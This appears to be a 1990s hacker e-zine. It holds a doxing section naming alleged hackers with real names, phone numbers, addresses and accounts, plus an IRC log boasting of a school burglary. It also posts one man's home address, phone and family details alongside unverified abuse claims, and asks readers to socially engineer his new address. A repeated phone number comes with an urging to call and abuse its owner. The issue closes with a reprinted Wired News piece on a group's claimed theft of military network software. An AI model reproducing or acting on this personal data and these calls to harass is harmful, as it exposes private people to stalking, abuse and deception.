*** irc.netsys.com : Thursday April 21 1994 -- 22:30 -07:00
*** y is root@deimos.cs.uah.edu (root)
*** on channels: #tacobell @#fedz @#lifesux 
*** on irc via server irc.math.ufl.edu (The Happiest Server on IRC)
_____
 
Oliver Friedrichs (aka. ][ceman)
Known Sites: bova.cc.umanitoba.ca
Email: umfriedr@bova.cc.umanitoba.ca
 
He is Canada local, he dials into "umfriedr.dial.umantobia.ca" and from
there likes his accounts at various machines in the cc.umanitoba.ca domain.
_____
 
(aka. "N0-D0Z3")
Known Hacked Sites: stdkrl@pip.shsu.edu
 
This guy is a mystery.  He is very malicious.  He has apparently hacked
all sorts of a long list of sites.  He is currently (940421) on the
"west coast" but is moving to Pittsburg next month.
 
Logs:
*** irc.netsys.com : Thursday April 21 1994 -- 18:30 -07:00
*** X is ~X@CAPELLA.CS.UTC.EDU (X)
*** on channels: #tacobell 
*** on irc via server Copper.Ucs.Indiana.Edu ([129.79.1.4] Indiana
+Experimental ALPHA AXP Server)
*** N0-D0Z3 is stdkrl@pip.shsu.edu (KATRINA RUTH LOUNSBERRY)
*** on channels: #tacobell 
*** on irc via server irc-2.mit.edu (Mass. Institute of Technology, Cambridge,
+MA, USA)
<N0-D0Z3> well, u guyz missed alot.. I came about this: --><-- close to
+getting my ass busted... I sorta did get busted actually..
<N0-D0Z3> I fuckin broke into the high school where I lived and stole some
+kewl shit... they found out it was me some how, and I split.
<N0-D0Z3> they got my picture plastered all over where I used to live.. fuck
+wantedand all that shit.. ehehe.. oh well.. I still got me a 386DX-40 out of
+it.
<N0-D0Z3> I took two full machines(cases) and one monitor.
<N0-D0Z3> X:I went the first night and got two machines.. full cases etc, one
+monitor and a keyboard...
<N0-D0Z3> I went back not the next night, but the night after, and got all the
+processors, the 1 gig HDD's from the two servers, novell netware boxed set,
+and then a camcorder and cd-rom from the library..
<N0-D0Z3> I came back to my house at about 3:00 am and my mom was home, so I
+fucking hid the shit behind the apartments and went to my friends who went
+with me and slept at his house, and when I went home the next day, suprise,
+it was all gone.
*** irc.netsys.com : Thursday April 21 1994 -- 18:31 -07:00
_____
 
(aka. "Dynastar")
 
He attends Carnegie Mellon University studying Mathematics (applying
for CS major there).  He is very fluent in 8051 Assembly (motorola)
and is a major Cellular Phone modification jockey.  He is probably
one of the best at this, and his Cellular mod for th 
He is one of these people:
 
[unix6.andrew.cmu.edu] 
dsa3     David Reeve Sward    *p1      Thu 15:15 
jl6b     Jesse L. Liu          p2      Thu 16:56 
jc7o     Joo C. Chung          p3      Thu 21:20 
jmdk     Jason C Miller        p4      Thu 18:42 
mh5u     Mathew Henson         pb      Thu 21:47 
_____
 
Evan Baker (aka. "Nightstriker")              voice: +1 301 390 1097
High School Student
Lives close to the campus of University of Maryland
College Park.
 
Big UMD.EDU and GMU.EDU hacker.  Past relations with various "posse"
members.
_____
 
(aka. "Vaxbuster")
 
This may not be his real name, but this is the account he uses
every time.
 
[unixd3.cis.pitt.edu]
Login name: cxzst1                      In real life: Cheng Zhao
Directory: /afs/pitt.edu/usr66/cxzst1   Shell: /bin/bash
Address mail to: cxzst1+@pitt.edu
Affiliation: Universal Student Computing [Provost]
Account used on Wed Apr 20 16:23 (1 day 9 hours ago).
No new mail; last read Tue Apr  5 23:34 (16 days ago).
Plan:
 
Home Phone        : 291-6799          
_____
 
Louis (aka. "Clovis")
Known accounts: afo3cmm@cabell.vcu.edu
 
DC/VA/MD Local.  Attends 2600 meetings regularly.  Very blonde
hair, blue eyes.  About 5'11 inches, dresses funny, about
130-135 pounds.  Not attending school currently.
_____
 
Dennis Sheil (aka. "Elite Entity", "Point of Presence") voice: +1 718-762-1597
35-19 165th Street
Flushing, NY
 
Email: elite@mindvox.phantom.com
_____
 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. RLoxley, first class fuckwit (and fatboy) : WH0 GN0Z?
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

There is a user on the Undernet IRC network called "RLoxley", he is a lame fuq,
he is also very fat, a compulsive liar, and child abuser..

He even moved house because of the abuse he was getting because of the way he
treats his two daughters (RLoxley is around 40 btw).

These are his old d0x from the 0wned.rolodex :


        Handles      : RLoxley, RLox1ey, op in #hackphreak on UnderNet.
        Name         : Kent Browne
        Phone        : (914) 628-6281
        Address      : 29 Mcgregor Drive
                       Mahopac, NY 10541
        -
        E-Mail       : mageus@bestweb.net
        -
        Wife's Name  : Colleen Browne
        -
        Other Family : Two daughters, one aged 6,
                       the other is 2 months old,
                       RLoxley abuses them on a daily basis..


If anyone socially engineers the people living at his old address for his
new mailing address and even a phone number, we will be mad impressed.

Here is an IRC log of so1o making RLoxley look like a fag.. (Malaka == RLoxley)

*** savec0re (~savec0re@zphn1-p107.worldonline.nl) has left #rhino9
<o1os> heh
<o1os> i just did something neat in #hackphreak
<o1os> heh
*** o1os is now known as os1o
*** os1o is now known as savec0re
*** Malaka (mageus@x2-7.katonah.bestweb.net) has joined #rhino9
<Malaka> where did pussy boy go?
<savec0re> *** so1o has quit IRC
<savec0re> ?
<savec0re> you mean so1o rlox?
<Malaka> yes, he is a wimp
*** Malaka is now known as RLox1ey
<savec0re> bbl
<RLox1ey> [13:57] <o1os> "RLoxley is looking for nominations on his new friends, please call 1-800-fagchat now and cast your vote"
<RLox1ey> now that he cant find me any more
<RLox1ey> this is what he resorts to
* su1d is away, auto-gone [tv/l]
*** chameleon (333@cx640648-a.msnv1.occa.home.com) has joined #rhino9
*** SyndIcate sets mode: +o chameleon
*** chameleon sets mode: +o savec0re
*** savec0re is now known as so1o
*** so1o sets mode: +b *!*@x2-7.katonah.bestweb.net
*** RLox1ey was kicked by so1o (he0ahe0ahah0aha)
<so1o> HAHAHAHAHAHHAHAA
<so1o> WHAT A LAME FUQ

Anyway, someone pull his new d0x.. mail them to tk85@hotmail.com or /msg so1o
on any IRC network..

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Carolyn Meinel d0x : savec0re
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Carolyn Meinel, unless you didn't already know, runs the happyhacker mailing
list for lame fuqz with no sk1llz, she herself however, also has no sk1llz,
and so is classified by the el8 board of classification is a LAME FUQ.

Phone her up and abuse her today..

(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675
(505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675  (505) 281-9675

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. MOD break DISN : Wired News
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  In what may be one of the first demonstrations of
  the potential of cyber warfare, an international
  cracking group claims it has stolen a suite of
  programs used to run classified US military
  networks and satellites. 

  The group, calling itself Masters of Downloading,
  or MOD, said in a statement that it had stolen the
  software -- the Defense Information Systems
  Network Equipment Manager (DEM) -- from the
  Defense Information Systems Agency, the branch
  of the Defense Department in charge of classified
  computer networks. 

  "This may help you to realize the reality of the
  threat of information warfare against the United
  States of America, as well as the DEM software's
  obvious value to certain global organizations and
  individuals," said the statement, which was
  supplied to Wired News by an anonymous
  representative of the group. 

  The statement detailed the capabilities of the DEM
  software, and was accompanied by a number of
  image files that depicted the program's interfaces.
  The software's authenticity was confirmed by John
  Vranesevich of the computer security site
  AntiOnline. Vranesevich said he obtained a copy
  from MOD last Thursday and tested it after first
  unplugging his computer from the Internet. 

  Vranesevich, who has tracked the computer
  underground for five years, said that the theft of a
  classified network control program pointed to a
  threat far more serious than the routine Web
  server intrusions of recent months. 

  "This is one of the first times we've seen a group of
  hackers whose goal was not to commit acts of
  Internet graffiti by defacing low-security Web
  pages, but [instead] to actually target, plan, and
  retrieve software suites designed for military use,"
  said Vranesevich. 

  Last month, Vranesevich was the first to interview
  Ehud Tenebaum, the Israeli teen at the center of a
  federal investigation into widespread attacks on
  US military computer systems. But those attacks
  pale in comparison, he says. 

  "[The deliberate theft of classified software] puts
  this group on a whole other playing field," said
  Vranesevich, who added that the group is
  comprised of 15 individuals, including eight
  Americans, five Britons, and two Russians. The
  group is not affiliated with Tenebaum, known as
  the Analyzer. 

  MOD said that the software is used to remotely
  monitor and manage military computer-related
  equipment, including routers, repeaters, switches,
  military communication networks, and GPS
  satellites and receivers. The suite's top-level
  interface is designed to "manage all the
  computer-related equipment used by the United
  States military," the statement read. 

  With the DEM software, the group claims, the
  entire Defense Information Systems Network could
  be shut down for a period of time. "This is
  definitely not a good thing for the United States
  military, as they depend heavily on their computer
  systems and networks to quickly share data and
  information from anywhere in the world," the
  statement said. 

  MOD went into detail over two particular software
  components, one of which allows a user with
  access to monitor or shut down T1 links used by
  the military. The other program concerns Global
  Positioning System satellites, which are used to
  establish precise coordinates for weapons
  targeting and the navigation of commercial aircraft.

  "Although the DEM software cannot be used to
  send data to the GPS satellites, it can be used to
  track the satellites and pinpoint their exact
  whereabouts, as well as the frequency ranges
  they use and other operational information," said
  the MOD statement. 

  MOD claims it first obtained the software in
  October 1997 but did nothing with it at first, to be
  sure that they were not being tracked. 

  Although the Defense Information Systems
  Agency public affairs office declined to comment,
  a mission statement on the agency's Web site
  clarifies its role within the Department of Defense:
  "DISA will be the preeminent provider of
  information systems delivery support to our
  warfighters and others as required by the DoD,
  under all conditions of Peace and War." 

  MOD members were not immediately available for
  comment, either, but in an interview with
  Vranesevich last Friday, group members said their
  intentions were not hostile. 

  "We have the power to do so, but at this time we
  have no intentions to launch such a [network]
  attack," a member told Vranesevich. Another
  member also told Vranesevich that he had
  obtained a separate piece of software used to
  communicate with submarines. 

  Gene Spafford, director of the Computer Security
  Research Center, COAST, said that the intrusion,
  if true, didn't surprise him. 

  "I don't think anyone who is familiar with
  government security has ever believed it to be as
  secure as claimed," Spafford said. 

  Spafford added that he was not familiar with DISA
  systems, but that any distributed system is
  vulnerable, and that many government systems
  are configured "for convenience and not need." 

  The group claimed that they stole the software
  from a Windows NT server at DISA, and that about
  30 individuals worldwide presently have copies. 

  "When you have a system that is distributed such
  that others can manipulate it, you open it up to not
  just security problems but also erroneous
  operations," Spafford said. "[You get] people who
  don't have training and [you get] accidents. It is a
  standard systems design question." 

  In an interview with Vranesevich, the group offered
  some network security advice for the US
  government. 

  "It's simple: take all [classified] military systems
  off the Internet, place only [unclassified] Web
  servers on the Internet [and] keep the rest on a
  purely internal network," the MOD member said. 

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


                      _   /|  k0dek4t sez...
                      \'o O'                            
                      =(_o_)=   "EyEm HuNGaRy FoR SKiLLz,
                        U               nOt CaTf00d!!#@"


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
r00td0wn r00tsux r00tsick m00ksr00t fr00tl00ps r00tyt00ty vr00mvr00m r00tg0b00m
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

